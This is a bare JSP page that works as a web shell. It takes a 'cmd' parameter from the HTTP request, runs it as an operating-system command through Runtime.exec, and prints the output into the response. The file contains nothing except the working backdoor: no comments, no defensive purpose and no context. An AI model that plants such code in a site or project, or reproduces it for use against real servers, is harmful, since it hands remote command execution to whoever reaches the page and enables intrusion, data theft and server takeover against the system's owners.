<%@ page contentType="text/html; charset=UTF-8" 
language="java" 
buffer="32kb"
import="java.lang.Runtime,java.io.*"
%> 
<% 
Runtime r = java.lang.Runtime.getRuntime(); 
String command = request.getParameter("cmd"); 
out.print(command);
try 
{ 
Process p = r.exec(command); 
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()),1024); 
while (br.read()!=-1) 
{ 
out.print(br.readLine()); 
} 
br.close(); 

}catch(IOException e) 
{ 
e.printStackTrace(); 
} 
%> 
